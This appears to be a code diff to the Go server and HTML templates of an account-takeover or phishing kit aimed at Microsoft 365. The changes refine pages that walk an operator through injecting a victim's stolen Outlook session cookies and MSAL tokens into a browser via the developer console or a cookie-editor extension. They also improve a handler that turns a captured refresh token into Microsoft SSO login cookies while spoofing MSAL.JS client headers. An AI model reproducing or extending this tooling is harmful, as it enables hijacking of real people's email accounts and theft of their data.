@@ -1335,21 +1335,25 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <a class="back" href="/dc/use/%s">&larr; Dashboard</a>
 <h1>Inject Browser Session</h1>
 <p class="sub">Full OWA access as <strong style="color:#fff">%s</strong> — cookies + tokens in one paste</p>
-<div class="card">
-<h2>Steps</h2>
+<div class="card" style="border-color:#1a3a5c">
+<h2 style="color:#4a9fd4">Important — run script on the right page</h2>
+<p style="font-size:13px;color:#bbb;margin-bottom:12px">
+  <strong style="color:#fff">Do NOT open outlook.office.com/mail/</strong> — it immediately redirects you to Microsoft login and the script runs on the wrong domain. You must run the script while your browser is on <strong style="color:#fff">outlook.office.com</strong>.
+</p>
 <ol class="steps">
-<li>Click <strong>Copy &amp; Open OWA</strong> — copies the script and opens outlook.office.com in a new tab</li>
-<li>In that new tab press <strong>F12</strong> → <strong>Console</strong> tab</li>
+<li>Click <strong>Copy Script</strong> below to copy the script</li>
+<li>Click <strong>Open OWA Auth Page</strong> — this opens a page that stays on <strong>outlook.office.com</strong> without redirecting</li>
+<li>Press <strong>F12</strong> → <strong>Console</strong> tab — confirm the URL bar still shows <strong>outlook.office.com</strong></li>
 <li>Paste (<strong>Ctrl+V</strong>) and press <strong>Enter</strong></li>
-<li>Page reloads → you are fully logged in as <strong>%s</strong></li>
+<li>Then navigate to <a href="https://outlook.office.com/mail/" target="_blank" style="color:#0078d4">outlook.office.com/mail/</a> — you will be logged in as <strong>%s</strong></li>
 </ol>
 </div>
 <div class="card">
 <h2>Injection Script <span style="font-size:10px;color:#444;font-weight:normal;text-transform:none;letter-spacing:0">(OWA session cookies + MSAL token cache)</span></h2>
 <textarea class="code" id="ta" readonly>%s</textarea>
 <div class="row">
-<a class="btn" href="https://outlook.office.com/mail/" target="_blank" onclick="doCopy()">Copy &amp; Open OWA</a>
-<button class="btn b2" id="cpbtn" onclick="doCopy()">Copy Only</button>
+<button class="btn" id="cpbtn" onclick="doCopy()">Copy Script</button>
+<a class="btn b2" href="https://outlook.office.com/owa/auth/logon.aspx?url=https://outlook.office.com/owa/&amp;reason=0" target="_blank">Open OWA Auth Page</a>
 <span class="ok" id="ok">Copied!</span>
 </div>
 <p class="note">If copy fails: click inside the text box, press Ctrl+A then Ctrl+C, then paste in the OWA console</p>
@@ -1441,24 +1445,43 @@ func (s *HttpServer) handleDCESTSCookies(w http.ResponseWriter, r *http.Request)
 		"&scope=" + url.QueryEscape("openid profile email offline_access") +
 		"&claims=" + url.QueryEscape(`{"access_token":{"xms_cc":{"values":["CP1"]}}}`)
 
+	// Step 1: token refresh — Microsoft sets fpc/esctx/buid in the jar
 	tokenURL := "https://login.microsoftonline.com/" + tenant + "/oauth2/v2.0/token"
 	req, _ := http.NewRequest("POST", tokenURL, strings.NewReader(form))
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
 	req.Header.Set("Origin", "https://login.microsoftonline.com")
+	req.Header.Set("Referer", "https://login.microsoftonline.com/")
 	req.Header.Set("Accept", "application/json, text/plain, */*")
-	client.Do(req) //nolint — we only care about cookies in the jar
+	req.Header.Set("X-Client-SKU", "MSAL.JS")
+	req.Header.Set("X-Client-Ver", "1.4.0")
+	client.Do(req) //nolint — we care about cookies in the jar
 
-	// Also hit the authorize endpoint to get interactive ESTS cookies
+	// Step 2: authorize with prompt=none using a web redirect_uri (not native-client)
+	// so Microsoft goes through the full SSO flow and sets ESTSAUTH/ESTSAUTHPERSISTENT.
 	authURL := "https://login.microsoftonline.com/" + tenant +
 		"/oauth2/v2.0/authorize?client_id=1950a258-227b-4e31-a9cf-717495945fc2" +
-		"&response_type=code&redirect_uri=" + url.QueryEscape("https://login.microsoftonline.com/common/oauth2/nativeclient") +
+		"&response_type=code" +
+		"&redirect_uri=" + url.QueryEscape("https://login.microsoftonline.com/common/reprocess") +
 		"&scope=" + url.QueryEscape("openid profile email offline_access") +
-		"&prompt=none&login_hint=" + url.QueryEscape(email)
+		"&response_mode=query" +
+		"&prompt=none" +
+		"&login_hint=" + url.QueryEscape(email) +
+		"&domain_hint=organizations"
 	req2, _ := http.NewRequest("GET", authURL, nil)
 	req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
 	req2.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req2.Header.Set("Referer", "https://login.microsoftonline.com/")
+	req2.Header.Set("Sec-Fetch-Site", "same-origin")
+	req2.Header.Set("Sec-Fetch-Mode", "navigate")
+	req2.Header.Set("Sec-Fetch-Dest", "document")
 	client.Do(req2) //nolint
+
+	// Step 3: hit the Microsoft login root to seed any remaining SSO cookies
+	req3, _ := http.NewRequest("GET", "https://login.microsoftonline.com/", nil)
+	req3.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+	req3.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	client.Do(req3) //nolint
 
 	// Collect ESTS cookies from jar
 	msLoginURL, _ := url.Parse("https://login.microsoftonline.com")
@@ -1561,14 +1584,20 @@ textarea.code{display:block;width:100%%;background:#111;border:1px solid #1a3a5c
 <h1>ESTS Login Cookies <span class="badge">%d cookies</span></h1>
 <p class="sub">Inject Microsoft SSO session cookies into your browser</p>
 %s
-<div class="card">
-<h2>Steps</h2>
-<ol class="steps">
-<li>Open <a href="https://login.microsoftonline.com" target="_blank"><strong>login.microsoftonline.com</strong></a> in your browser (logged out is fine)</li>
-<li>Press <strong>F12</strong> → <strong>Console</strong> tab</li>
-<li>Click <strong>Copy Script</strong>, paste in console, press <strong>Enter</strong></li>
-<li>Page redirects to Microsoft login — you should be automatically signed in as <strong>%s</strong></li>
-</ol>
+<div class="card" style="border-color:#1a3a5c">
+<h2 style="color:#4a9fd4">Two ways to inject — use Cookie Editor (recommended)</h2>
+<p style="font-size:13px;color:#bbb;margin-bottom:14px">
+  <strong style="color:#fff">Method A — Cookie Editor extension</strong> (best, sets HttpOnly cookies correctly):<br>
+  &nbsp;1. Install <strong>Cookie Editor</strong> from Chrome/Firefox extension store<br>
+  &nbsp;2. Open <a href="https://login.microsoftonline.com" target="_blank" style="color:#0078d4">login.microsoftonline.com</a><br>
+  &nbsp;3. Click Cookie Editor icon → <strong>Import</strong> tab → paste the Cookie Editor JSON below → click <strong>Import</strong><br>
+  &nbsp;4. Refresh the page → signed in as <strong>%s</strong>
+</p>
+<p style="font-size:13px;color:#bbb">
+  <strong style="color:#fff">Method B — Console script</strong> (sets cookies without HttpOnly flag, may not always work):<br>
+  &nbsp;1. Open <a href="https://login.microsoftonline.com" target="_blank" style="color:#0078d4">login.microsoftonline.com</a> → F12 → Console<br>
+  &nbsp;2. Copy Script below → paste → Enter
+</p>
 </div>
 <div class="card">
 <h2>Injection Script</h2>
